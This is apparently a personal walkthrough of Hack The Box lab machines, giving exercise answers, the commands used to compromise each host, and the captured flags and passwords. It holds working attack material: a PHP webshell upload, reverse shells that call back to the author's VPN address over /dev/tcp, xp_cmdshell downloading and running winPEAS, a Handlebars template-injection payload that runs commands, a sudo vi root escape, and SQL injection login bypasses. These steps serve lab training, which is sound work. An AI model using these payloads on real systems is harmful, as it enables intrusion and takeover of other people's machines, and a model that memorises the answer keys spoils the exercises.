## Machines

### Meow <img src="fig/fa-linux.svg" width="25" height="25">

What tool do we use to test our connection to the target with an ICMP echo request?
```bash
ping "10.129.74.130"
```

What service do we identify on port 23/tcp during our scans?
```bash
nmap -p 23 "10.129.74.130"
```

What username is able to log into the target over telnet with a blank password?
```bash
telnet -l root "10.129.74.130" 23
cat flag.txt
```

### Fawn <img src="fig/fa-linux.svg" width="25" height="25">

What does the 3-letter acronym FTP stand for? File Transfer Protocol.

Which port does the FTP service listen on usually? Port 21.

What acronym is used for the secure version of FTP? `sftp`.

From your scans, what version is FTP running on the target? `vsftpd 3.0.3`.

From your scans, what OS type is running on the target? Unix.

What is username that is used over FTP when you want to log in without having an account? From the scan:
```bash
nmap -sV -A -T4 10.129.15.46
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

The output `ftp-anon` is a [script](https://nmap.org/nsedoc/scripts/ftp-anon.html) from `nmap`. It checks if the FTP running service allows for anonymous login.

From GitHub [Default-Credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt), we see `anonymous:anonymous`.

What is the response code we get for the FTP message "Login successful"? 230.
```bash
ftp "10.129.15.46"
Name (10.129.15.46:sekai): anonymous
331 Please specify the password.
Password: anonymous
230 Login successful.
```

What is the command used to download the file we found on the FTP server? `get`.
```bash
ftp> ls
ftp> get flag.txt
```

### Dancing <img src="fig/fa-windows.svg" width="25" height="25">

What does the 3-letter acronym SMB stand for? Server Message Block.

What port does SMB use to operate at? Port 445 (or 139, NetBIOS).
```bash
nmap -sV -A -T4 10.129.71.114
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Host script results:
| smb2-time:
|   date: 2024-03-21T18:12:02
|_  start_date: N/A
|_clock-skew: 3h59m59s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
```

What is the service name for port 445 that came up in our scan? `microsoft-ds`.

What is the 'flag' or 'switch' that we can use with the smbclient utility to 'list' the available shares on Dancing?
```bash
sudo pacman -S smbclient
smbclient -L 10.129.71.114
Password: (empty)
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN\$         Disk      Remote Admin
        C\$             Disk      Default share
        IPC\$           IPC       Remote IPC
        WorkShares      Disk
```

What is the name of the share we are able to access in the end with a blank password? WorkShares.

```bash
smbclient -N //10.129.71.114/Workshares
smb: \> ls
smb: \> cd James.P
smb: \> get flag.txt
```

### Redeemer <img src="fig/fa-linux.svg" width="25" height="25">

Which TCP port is open on the machine? HTB hints that the TCP open port has 4 digits and the last one is 9. Generate a list `ports9.txt` with these ports and
```bash
for port in $(cat ports9.txt) ; do
  nmap -p $port 10.129.70.15 >> scan.txt
done
grep -i "open" scan.txt
```

Which service is running on the port that is open on the machine? `redis` is open on port 6379.

What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database.
Googling about Redis, we see that it is an "in-memory Database".

Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.
```bash
sudo pacman -S redis
redis-cli -h 10.129.70.15
```

Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? From [https://redis.io/commands/](https://redis.io/commands/), `info`.
```bash
10.129.70.15:6379> info
10.129.70.15:6379> select 0
10.129.70.15:6379> info
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
10.129.70.15:6379> keys *
10.129.70.15:6379> get flag
```


What is the version of the Redis server being used on the target machine? `5.0.7`.

Which command is used to select the desired database in Redis? `select 0`.

How many keys are present inside the database with index 0? 4.

### Explosion <img src="fig/fa-windows.svg" width="25" height="25">
What does the 3-letter acronym RDP stand for? Remote Desktop Protocol.

What is a 3-letter acronym that refers to interaction with the host through a command line interface? cli.

What about graphical user interface interactions? gui.

What is the name of an old remote access tool that came without encryption by default and listens on TCP port 23? telnet.

What is the name of the service running on port 3389 TCP? ms-wbt-server.

What is the switch used to specify the target host's IP when using xfreerdp? `/v:`.

What username successfully returns a desktop projection to us with a blank password? Administrator.
```bash
sudo pacman -S freerdp
xfreerdp /v:10.129.150.101:3389 /u:Administrator
```

### Preignition <img src="fig/fa-linux.svg" width="25" height="25">

Directory Brute-forcing is a technique used to check a lot of paths on a web server to find hidden pages. Which is another name for this? (i) Local File Inclusion, (ii) dir busting, (iii) hash cracking. (ii) dir busting.

What switch do we use for nmap's scan to specify that we want to perform version detection? `-sV`.

What does Nmap report is the service identified as running on port 80/tcp? `http`.

What server name and version of service is running on port 80/tcp? `nginx 1.14.2`.
```bash
nmap -sV -p 80 10.129.90.209
```

What switch do we use to specify to Gobuster we want to perform dir busting specifically? `dir`.

When using gobuster to dir bust, what switch do we add to make sure it finds PHP pages? `-x php`.
```bash
gobuster dir -x php -w wordlist.txt -u 10.129.90.209
```

Kali Linux already comes with wordlists, but we can download on [GitHub](https://github.com/daviddias/node-dirbuster/blob/master/lists/directory-list-2.3-medium.txt).

What page is found during our dir busting activities? `admin.php`.

What is the HTTP status code reported by Gobuster for the discovered page? `200`.

Go to `http://10.129.90.209/admin.php`. Log in with `admin:admin`.

### Mongod <img src="fig/fa-linux.svg" width="25" height="25">

How many TCP ports are open on the machine? 2 ports. Port 22 for `ssh` and 27017 for `mongodb`.

Scan for every single port, because MongoDB uses ports with high numbers.
```bash
nmap -O -sV -p- -Pn 10.129.181.87
```

Which service is running on port 27017 of the remote host? `MongoDB 3.6.8`.

What type of database is MongoDB? (Choose: SQL or NoSQL) NoSQL.

What is the command name for the Mongo shell that is installed with the mongodb-clients package? `mongo` or `mongosh`.

What is the command used for listing all the databases present on the MongoDB server? `show dbs`. Take a look at [Pentesting MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb).

What is the command used for listing out the collections in a database? `show collections`.

What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read? `db.flag.find().pretty()`.
```bash
sudo pacman -S mongodb-bin
mongosh 10.129.181.87
> show dbs
> use sensitive_information
> show collections
> db.flag.find().pretty()
```

### Synced <img src="fig/fa-linux.svg" width="25" height="25">

What is the default port for rsync? 873.

How many TCP ports are open on the remote host? 1.
```bash
nmap -sV -Pn -p- -T4 10.129.195.160
```

What is the protocol version used by rsync on the remote machine? 31.

What is the most common command name on Linux to interact with rsync? `rsync`.

What credentials do you have to pass to rsync in order to use anonymous authentication? `None`.

What is the option to only list shares and files on rsync? Do `rsync -h | grep list`. The option is `--list-only`.
```bash
sudo pacman -S tldr     # GREAT TOOL
tldr rsync
rsync rsync://10.129.195.160
public      Anonymous Share
rsync rsync://10.129.195.160/public
rsync rsync://10.129.195.160/public/flag.txt ./
```

### Appointment <img src="fig/fa-linux.svg" width="25" height="25">

What does the acronym SQL stand for? Structured Query Language.

What is one of the most common type of SQL vulnerabilities? SQL Injection.

What is the 2021 OWASP Top 10 classification for this vulnerability? A03:2021-Injection.

What does Nmap report as the service and version that are running on port 80 of the target?

`Apache httpd 2.4.38 ((Debian))`.
```bash
sudo nmap -sV -O -Pn -T4 -p 80 10.129.193.161
```

What is the standard port used for the HTTPS protocol? 443.

What is a folder called in web-application terminology? directory.

What is the HTTP response code is given for `Not Found' errors? 404.

Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains? `dir`.

What single character can be used to comment out the rest of a line in MySQL? `#`.

If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned? Congratulations.



Go to `http://10.129.193.161` and we see a login screen. Googling "login as admin sql injection", we [come up with](https://sechow.com/bricks/docs/login-1.html) the idea of putting some arbitrary entry in the user field, and `passwd' or '1'='1` in the password field.

The idea is that, when `user="user"` and `password="passwd"`, the server is executing a SQL query like:
```sql
SELECT * FROM users WHERE user='user' and password='passwd'
```
If we put `user="user"` and `password="passwd' or '1'='1"`, the query becomes
```sql
SELECT * FROM users WHERE user='user' and password='passwd' or '1'='1'
```
The `password='passwd' or '1'='1'` condition is always true, so the password verification never happens.


Another way to do it is putting `user="' or 1#"` and `password="asd"`. The `#` character will comment out the rest of the line, and the constant `1` is always true.

### Sequel <img src="fig/fa-linux.svg" width="25" height="25">

During our scan, which port do we find serving MySQL? 3306 standard `mysql` port.

What community-developed MySQL version is the target running? MariaDB.

When using the MySQL command line client, what switch do we need to use in order to specify a login username? `-u`.

Which username allows us to log into this MariaDB instance without providing a password? `root`.

In SQL, what symbol can we use to specify within the query that we want to display everything inside a table? `*`.

In SQL, what symbol do we need to end each query with? `;`.

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host? `htb`.
```bash
[sekai@arch ~]$ mariadb -u root -h "10.129.44.239"
```
```sql
MariaDB [(none)]> show databases;
MariaDB [(none)]> use htb;
MariaDB [htb]> show tables;
MariaDB [htb]> select * from config;
```

### Crocodile <img src="fig/fa-linux.svg" width="25" height="25">

What Nmap scanning switch employs the use of default scripts during a scan? `-sC`.
```bash
[sekai@arch ~]$ nmap -T5 -sC -A -p- --min-rate=500 "10.129.222.85"
```
```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.15.23
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Smash - Bootstrap Business Template
Service Info: OS: Unix
```

What service version is found to be running on port 21? `vsftpd 3.0.3`.

What FTP code is returned to us for the "Anonymous FTP login allowed" message? `230`.

After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously? `anonymous`.

After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server? `get`.

What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server? `admin`.

What version of Apache HTTP Server is running on the target host? `Apache httpd 2.4.41`.

What switch can we use with Gobuster to specify we are looking for specific filetypes? `-x`.
```bash
ftp 10.129.222.85
ftp> ls
ftp> get allowed.userlist
ftp> get allowed.userlist.passwd
ftp> exit
gobuster dir -x php -w directory-list-2.3-medium.txt -u 10.129.222.85
```

Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service? `login.php`.

Go to `10.129.222.85/login.php` and put `username=admin` and `password=rKXM59ESxesUFHAd`.

### Responder <img src="fig/fa-windows.svg" width="25" height="25">

When visiting the web service using the IP address, what is the domain that we are being redirected to? `unika.htb`.
```bash
[sekai@arch ~]# sudo nmap -T5 -sC -sV -O -p 80 "10.129.97.105"
```
```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Which scripting language is being used on the server to generate webpages? `php`.
```bash
[sekai@arch ~]# gobuster dir -x html \
-w Workspace/wordlists/directory-list-2.3-small.txt -u "10.129.97.105"
```
```bash
/english.html         (Status: 200) [Size: 46453]
/french.html          (Status: 200) [Size: 47199]
/german.html          (Status: 200) [Size: 46984]
```

What is the name of the URL parameter which is used to load different language versions of the webpage? `page`.

We can access `http://10.129.97.105/english.html`, `http://10.129.97.105/french.html`, etc.

In order to access `http://10.129.97.105` (it redirects us to `http://unika.htb`, which has no connection), we need to change our `/etc/hosts` file:
```bash
/etc/hosts
# custom hosts
10.129.97.105   unika.htb
```

Which of the following values for the `page' parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
```bash
../../../../../../../../windows/system32/drivers/etc/hosts
```

Which of the following values for the `page' parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
```bash
//10.10.14.208/somefile
```

In this case `10.10.14.208` is my IP address on the VPN.

What does NTLM stand for? New Technology LAN Manager.

Which flag do we use in the Responder utility to specify the network interface? `-I`.
```bash
yay -S responder
echo "sometext" > somefile
ip a
responder -I tun0
```

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john', but the full name is what? John the Ripper.

Then we go to `unika.htb/?page=//10.10.14.208/somefile`. The `responder` utility than obtains a NTLMv2 hash. We save it to `hash.txt`, then use `john`:
```bash
sudo pacman -S john
tldr john
john hash.txt
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
badminton        (Administrator)
```

What is the password for the administrator user? `badminton`.

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on? `5985`, result of our scan.

We need to install `evil-winrm` to remotely access the Windows service.
```bash
yay -S ruby-evil-winrm
tldr evil-winrm
evil-winrm --ip 10.129.83.31 --user Administrator --password badminton -P 5985
```

We get the error
```bash
Error: An error of type OpenSSL::Digest::DigestError happened, message is Digest
initialization failed: initialization error
```

I found the [solution](https://forum.manjaro.org/t/openssl-issue-with-ruby-3-0-6p216/147369) to this issue by editing the `/etc/ssl/openssl.cnf` file. The following sections need to be modified:
```bash
[provider_sect]
default = default_sect
legacy = legacy_sect

[default_sect]
activate = 1

[legacy_sect]
activate = 1
```

Now we can hack the machine:
```bash
evil-winrm --ip 10.129.97.105 --user Administrator --password badminton -P 5985
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls ..
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike
*Evil-WinRM* PS C:\Users\Administrator\Documents> ls /Users/mike/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Documents> cat /Users/mike/Desktop/flag.txt
*Evil-WinRM* PS C:\Users\Administrator\Documents> exit
```

### Three <img src="fig/fa-linux.svg" width="25" height="25">

```bash
nmap -T5 -Pn -sV -p- --min-rate=1000 "10.129.193.208"
```
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
How many TCP ports are open? `2`.

What is the domain of the email address in the ``Contact" section of the website? `thetoppers.htb`.

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames? `/etc/hosts`.
```bash
echo "10.129.193.208    thetoppers.htb" | sudo tee -a /etc/hosts
```

```bash
gobuster vhost -w subdomains-top1million-5000.txt -u thetoppers.htb --append-domain
```
The option `--append-domain` is important. Otherwise, the wordlist file must contain the full domains.
Which sub-domain is discovered during further enumeration? `s3.thetoppers.htb`.

Which service is running on the discovered sub-domain? amazon s3.
```bash
echo "10.129.193.208    s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

Which command line utility can be used to interact with the service running on the discovered sub-domain? `awscli`.

Which command is used to set up the AWS CLI installation? `aws configure`.

What is the command used by the above utility to list all of the S3 buckets? `aws s3 ls`.

This server is configured to run files written in what web scripting language? `php`.
```bash
pacman -Ss amazon
sudo pacman -S aws-cli
aws configure
```

Use fake values for the AWS account, since it does not matter.
```bash
AWS Access Key ID [None]: aSsad
AWS Secret Access Key [None]: adsasd
Default region name [None]: asdijigj
Default output format [None]: idjoa
```

```bash
aws s3 ls s3://thetoppers.htb
Could not connect to the endpoint URL: "http://s3.a.amazonaws.com/thetoppers.htb"
```

Modify the endpoint URL. Upload a simple PHP webshell `shell.php`.
```bash
$ aws s3 ls --endpoint-url=http://s3.thetoppers.htb s3://thetoppers.htb
$ echo "<?php system($_GET['cmd']); ?>" > shell.php
$ aws s3 cp --endpoint-url=http://s3.thetoppers.htb shell.php s3://thetoppers.htb
```

Next we go to the website with URL parameters:
```bash
http://thetoppers.htb/shell.php?cmd=ls
images index.php shell.php
http://thetoppers.htb/shell.php?cmd=ls ..
flag.txt html
http://thetoppers.htb/shell.php?cmd=cat ../flag.txt
```

### Ignition <img src="fig/fa-linux.svg" width="25" height="25">

```bash
nmap -T5 -p- -sV -sC --min-rate=1000 "10.129.127.25"
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
```
```bash
echo "10.129.127.25  ignition.htb" | sudo tee -a /etc/hosts
```

Which service version is found to be running on port 80? `nginx 1.14.2`.

What is the 3-digit HTTP status code returned when you visit http://{machine IP}/? `302` (redirection code). Can be seen in Burp.

What is the virtual host name the webpage expects to be accessed by? `ignition.htb`.

What is the full path to the file on a Linux computer that holds a local list of domain name to IP address pairs? `/etc/hosts`.

Use a tool to brute force directories on the webserver. What is the full URL to the Magento login page? `http://ignition.htb/admin`.
```bash
gobuster dir -u http://ignition.htb -w common.txt -x php,html
```

Look up the password requirements for Magento and also try searching for the most common passwords of 2023. Which password provides access to the admin account? `qwerty123`. Literally search Google for top 10 most common passwords and try each one. Not very interesting. We could also use `hydra` for this.

### Bike <img src="fig/fa-linux.svg" width="25" height="25">

 What TCP ports does nmap identify as open? Answer with a list of ports seperated by commas with no spaces, from low to high. `22,80`.
```bash
nmap -T5 -p- -sV -sC --min-rate=1000 "10.129.76.182"
echo "10.129.76.182" | sudo tee -a /etc/hosts
```

What software is running the service listening on the http/web port identified in the first question? `node.js`, from Wappalyzer.

What is the name of the Web Framework according to Wappalyzer? `Express`, from Wappalyzer.

What is the name of the vulnerability we test for by submitting `{{7*7`}}? Server-Side Template Injection. [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection).

What is the templating engine being used within Node.JS? `handlebars`, from `node.js`. Can be seen by putting `{{7*7`}} in the email entry.

What is the name of the BurpSuite tab used to encode text? Decoder. I need to study BurpSuite. The idea is to encode the SSTI code from HackTricks into an URL.

In order to send special characters in our payload in an HTTP request, we'll encode the payload. What type of encoding do we use? `URL`.

When we use a payload from HackTricks to try to run system commands, we get an error back. What is "not defined" in the response error? `require`. It's from a node.js module.

What variable is the name of the top-level scope in Node.JS? `global`.

HackTricks' payload for `handlebars` uses a module called `require`, which is not global in `node.js` and we can not access it. But if we search in the documentation [https://nodejs.org/api/globals.html](https://nodejs.org/api/globals.html), we see that the module `process` is global and have similar functionality as `require`. So, we modify the payload to use the `process` module. Remember it has to be encoded into an URL.
```js
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

The `whoami` command through the payload returns `root` in BurpSuite.
Change the command to `cat /root/flag.txt` and we have our flag!

By exploiting this vulnerability, we get command execution as the user that the webserver is running as. What is the name of that user? `root`.

### Archetype <img src="fig/fa-windows.svg" width="25" height="25">

Which TCP port is hosting a database server? `1433`.
```bash
nmap -T5 -sC -sV -p- --min-rate=1000 10.129.78.109 > scan.txt
```

What is the name of the non-Administrative share available over SMB? `backups`.
```bash
smbclient -L 10.129.78.109
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
smbclient -N //10.129.78.109/backups
smb: \> get prod.dtsConfig
```

What is the password identified in the file on the SMB share? `M3g4c0rp123`.

What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? `mssqlclient.py`.

What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? `xp_cmdshell`.


What script can be used in order to search possible paths to escalate privileges on Windows hosts? `winpeas`.

We download `winPEASx64.exe` script from [GitHub](https://github.com/carlospolop/PEASS-ng/releases/) and establish a simple http server with `python` to upload the script to the victim machine. In this case, my `tun0` IP address is `10.10.15.125`.
```bash
mkdir http_server
mv winPEASx64.exe http_server
cd http_server
sudo python3 -m http.server 80
```

The command below returns an error
```bash
mssqlclient.py -windows-auth ARCHETYPE/sql_svc:M3g4c0rp123@10.129.78.109
[-] [('SSL routines', 'state_machine', 'internal error')]
```

After searching a little, we see that this is a known issue with a known solution:

* You gotta find the lib files for your impacket `/home/user/.local/lib/python3.11/site-packages/impacket/`.

* Edit your `tds.py`. Find both lines defining the `ctx`:
```python
ctx = SSL.Context(SSL.TLSv1_METHOD)
```

* Change it to

```python
ctx = SSL.Context(SSL.TLSv1_2_METHOD)
```

* Don’t forget to change both lines where this happens. Save and you’re done.

We can then proceed:

```bash
SQL> enable_xp_cmdshell
SQL> xp_cmdshell "powershell dir \ "
SQL> xp_cmdshell "powershell Invoke-WebRequest
10.10.15.125/winPEASx64.exe -OutFile \Users\Public\winPEASx64.exe"
SQL> xp_cmdshell "\Users\Public\winPEASx64.exe"
```

The `winPEASx64.exe` script outputs a lot of files with read permissions. One of them is
```bash
\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
What file contains the administrator's password? `ConsoleHost_history.txt`.

```bash
SQL> xp_cmdshell "powershell Get-Content \Users\sql_svc\Desktop\user.txt"
3e7b102e78218e935bf3f4951fec21a3
SQL> xp_cmdshell "powershell Get-Content
\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

Below we need to scape the `!` character as `\!`, otherwise the shell will misinterpret the command.
```bash
SQL> smbclient --user=Administrator --password=MEGACORP_4dm1n\!\! //10.129.78.109/C$
SQL> get Users\Administrator\Desktop\root.txt
```

Submit user flag: 3e7b102e78218e935bf3f4951fec21a3.

Submit root flag: b91ccec3305e98240082d4474b848528.

### Oopsie <img src="fig/fa-linux.svg" width="25" height="25">

* With what kind of tool can intercept web traffic? proxy.

* What is the path to the directory on the webserver that returns a login page? `/cdn-cgi/login`.

* What can be modified in Firefox to get access to the upload page? cookie.

* What is the access ID of the admin user? 34322. The `id` URL parameter was `2`. Change it to `id=1`:
```bash
http://10.129.210.215/cdn-cgi/login/admin.php?content=accounts&id=1
```

Upload a `shell.php` to the webserver:
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.63/4242 0>&1'");?>
```

* On uploading a file, what directory does that file appear in on the server? `/uploads`.

* What is the file that contains the password that is shared with the robert user? `db.php`.
```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

The string `M3g4C0rpUs3r!` is the password for the `robert` user on the server.

* What executable is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? `find / -group bugtracker 2>/dev/null`.

* Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? `root`.

* What SUID stands for? `set owner user id`.

Execute `ltrace ./bugtracker` to see what it does.

* What is the name of the executable being called in an insecure manner? `cat`.

Provide `../root.txt` as the Bug ID and we obtain the flag.

* Submit user flag: `f2c74ee8db7983851ab2a96a44eb7981`.

* Submit root flag: `af13b0bee69f8a877c3faf667f7beacf`.

### Vaccine <img src="fig/fa-linux.svg" width="25" height="25">

* Besides SSH and HTTP, what other service is hosted on this box? `ftp`.

* This service can be configured to allow login with any password for specific username. What is that username? `anonymous`.

* What is the name of the file downloaded over this service? `backup.zip`.

* What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? `zip2john`.

```bash
zip2john backup.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
john --show zip.hash
backup.zip:741852963::backup.zip:style.css, index.php:backup.zip
```

Inside the `index.php` file we see `md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3"`. Therefore we save the `md5` hash in a file `md5.hash` and use `john` again. HTB tells us that the password has 9 digits and the last digit is a 9. We use this information to provide a shorter wordlist `rock9.txt`:
```bash
grep "^........9$" rockyou.txt > rock9.txt
john --fork=8 --wordlist=rockyou.txt --format=raw-md5 md5.hash
```

* What is the password for the admin user on the website? `qwerty789`.

Log in to the website and get cookie `PHPSESSID` through the browser.

* What option can be passed to sqlmap to try to get command execution via the sql injection? `--os-shell`.

The password for the `postgres` user is in `/var/www/html/dashboard.php`.

* What program can the postgres user run as root using sudo? `vi`.

```bash
sqlmap --os-shell -u 'http://10.129.125.244/dashboard.php?search=a' \
--cookie="PHPSESSID=8hqp5tfa06tf7q9985pv3hdtmv" --flush-session
nc -lvnp 4242
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.14.63/4242 0>&1'
postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c 'import pty; pty.spawn("/bin/bash")'
postgres@vaccine:/var/lib/postgresql/11/main$ sudo -l
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:/var/lib/postgresql/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
:!sudo su
root@vaccine:/var/lib/postgresql/11/main# cat /root/root.txt
root@vaccine:/var/lib/postgresql/11/main# find / -name "user.txt" 2>/dev/null
root@vaccine:/var/lib/postgresql/11/main# cat /var/lib/postgresql/user.txt
```

* Submit user flag: `ec9b13ca4d6229cd5cc1e09980965bf7`.

* Submit root flag: `dd6e058e814260bc70e9bbdef2715849`.

### Unified <img src="fig/fa-linux.svg" width="25" height="25">

* Which are the first four open ports? `22, 6789, 8080, 8443`.

* What is the title of the software that is running running on port 8443? `UniFi Network`.

* What is the version of the software that is running? `6.4.54`.

* What is the CVE for the identified vulnerability? `CVE-2021-44228`.

* What protocol does JNDI leverage in the injection? `LDAP`.

* What tool do we use to intercept the traffic, indicating the attack was successful? `tcpdump`.

* What port do we need to inspect intercepted traffic for? `389`.

* What port is the MongoDB service running on? `27117`.

* What is the default database name for UniFi applications? `ace`.

* What is the function we use to enumerate users within the database in MongoDB? `db.admin.find()`.

* What is the function we use to update users within the database in MongoDB? `db.admin.update()`.

* What is the password for the root user? `NotACrackablePassword4U2022`.

* Submit user flag: `6ced1a6a89e666c0620cdb10262ba127`.

* Submit root flag: `e50bc93c75b634e4b272d2f771c33681`.

### TwoMillion <img src="fig/fa-linux.svg" width="25" height="25">

TwoMillion has been pwned.

Checkout [CVE-2023-4911](https://github.com/NishanthAnand21/CVE-2023-4911-PoC) and [CVE-2023-0386](https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/overlayfs-cve-2023-0386).
